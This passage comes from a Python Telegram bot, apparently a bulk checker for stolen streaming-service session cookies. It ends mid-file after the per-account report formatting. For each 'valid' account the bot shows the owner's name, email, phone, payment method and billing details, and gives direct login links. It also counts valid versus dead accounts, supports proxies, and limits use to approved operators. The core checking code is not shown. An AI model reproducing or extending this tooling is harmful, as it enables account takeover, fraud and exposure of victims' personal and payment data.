                        f"• Name: {acct.get('name', 'Unknown')}\n"
                        f"• Email: {acct.get('email', 'Unknown')}\n"
                        f"• Country: {acct.get('country', 'Unknown')}\n"
                        f"• Plan: {acct.get('plan', 'Unknown')}\n"
                        f"• Price: {acct.get('plan_price', 'N/A')}\n"
                        f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
                        f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
                        f"• Payment: {acct.get('payment_method', 'CC')}\n"
                        f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
                        f"• Quality: {acct.get('video_quality', 'HD')}\n"
                        f"• Streams: {acct.get('max_streams', '2')}\n"
                        f"• Hold Status: {acct.get('on_payment_hold', 'No')}\n"
                        f"• Extra Member: {acct.get('extra_member', 'No')}\n"
                        f"• Extra Member Slot: Unknown\n"
                        f"• Email Verified: {acct.get('email_verified', 'No')}\n"
                        f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                        f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
                        f"• Profiles: {acct.get('profiles', 'Unknown')}"
                    )

                    keyboard = [
                        [
                            InlineKeyboardButton("💻 PC Login", url=desktop_link),
                            InlineKeyboardButton("📱 Phone Login", url=phone_link)
                        ]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    await update.message.reply_text(
                        formatted_text,
                        reply_markup=reply_markup,
                        disable_web_page_preview=True
                    )
                    valid_count += 1
                else:
                    dead_count += 1
            except Exception as e:
                logger.error(f"Error checking {display_name}: {e}")
                dead_count += 1

        if cancel_bulk_event.is_set():
            await status_msg.edit_text(
                f"🛑 Bulk Check Stopped Manually!\n\n"
                f"🟢 Valid Found: {valid_count}\n"
                f"🔴 Dead / Invalid: {dead_count}"
            )
        else:
            await status_msg.edit_text(
                f"✅ Bulk Check Completed!\n\n"
                f"🟢 Valid Found: {valid_count}\n"
                f"🔴 Dead / Invalid: {dead_count}"
            )

    except Exception as e:
        logger.error(f"Error handling document: {e}")
        await status_msg.edit_text(f"❌ Error processing document: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


# ========== MAIN THREAD LOOP ==========
def run_bot_in_thread():
    global application
    
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("addproxy", addproxy_command))
        # block=False ensures /stop handler runs concurrently while handle_document is busy
        application.add_handler(CommandHandler("stop", stop_command, block=False))
        application.add_handler(CommandHandler("approve", approve_command))
        application.add_handler(CommandHandler("disapprove", disapprove_command))
        application.add_handler(CommandHandler("approved", approved_list_command))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
        
        loop.run_until_complete(
            application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                stop_signals=()
            )
        )
    except Exception as e:
        logger.error(f"❌ Bot runtime error: {e}")
        application = None
    finally:
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.close()
        except Exception:
            pass


if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        sys.exit(1)
    
    bot_thread = Thread(target=run_bot_in_thread, daemon=True)
    bot_thread.start()
    
    time.sleep(2)
    
    try:
        logger.info(f"🚀 Starting Flask server on port {PORT}\n")
        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except OSError as e:
        logger.warning(f"⚠️ Port {PORT} busy ({e}), retrying on fallback port 8080...")
        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)
    except (KeyboardInterrupt, SystemExit):
        logger.info("🛑 Shutting down server gracefully...")
        sys.exit(0)
